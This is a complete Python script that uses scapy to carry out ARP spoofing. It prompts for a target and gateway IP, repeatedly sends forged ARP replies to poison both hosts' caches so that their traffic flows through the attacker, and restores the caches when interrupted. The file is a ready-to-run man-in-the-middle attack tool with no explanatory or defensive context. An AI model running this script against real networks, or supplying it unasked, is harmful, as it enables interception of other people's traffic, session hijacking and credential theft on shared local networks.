import scapy.all as scapy
import os
import time

def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

	return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
	dst_mac = get_mac(dest_ip)
	src_mac = get_mac(src_ip)
	packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
	scapy.send(packet, count=4, verbose=False)

target_ip = str(input("Enter Target IP address: "))
gateway_ip = str(input("Enter Gateway IP address: "))

packet_count = 0

try:
	while True:
		spoof(target_ip, gateway_ip)
		spoof(gateway_ip, target_ip)
		packet_count = packet_count + 2
		print("\r[+] Packets sent: " + str(packet_count), end="")
		time.sleep(3)

except KeyboardInterrupt:
	print("\r[+] CTRL + C detected............ Quitting.\n", end="")
	restore(gateway_ip, target_ip)
	restore(target_ip, gateway_ip)
